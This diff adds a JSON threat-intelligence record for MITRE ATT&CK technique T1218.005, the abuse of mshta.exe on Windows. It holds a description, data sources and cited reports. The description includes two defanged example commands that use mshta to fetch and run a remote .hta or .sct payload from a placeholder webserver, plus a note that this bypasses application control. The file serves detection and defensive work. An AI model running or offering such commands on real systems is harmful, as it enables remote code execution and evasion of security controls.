@@ -1,0 +1,73 @@
+[
+  {
+    "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+    "platform": "windows",
+    "tid": "T1218.005",
+    "technique": "Mshta",
+    "tactic": "defense-evasion",
+    "datasources": "command-execution|file-creation|network-connection-creation|process-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+    "technique_references": [
+      {
+        "source_name": "Cylance Dust Storm",
+        "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf",
+        "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Red Canary HTA Abuse Part Deux",
+        "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
+        "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "FireEye Attacks Leveraging HTA",
+        "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html",
+        "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Airbus Security Kovter Analysis",
+        "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/",
+        "description": "Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "FireEye FIN7 April 2017",
+        "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
+        "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Wikipedia HTML Application",
+        "url": "https://en.wikipedia.org/wiki/HTML_Application",
+        "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "MSDN HTML Applications",
+        "url": "https://msdn.microsoft.com/library/ms536471.aspx",
+        "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "LOLBAS Mshta",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+        "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  }
+]
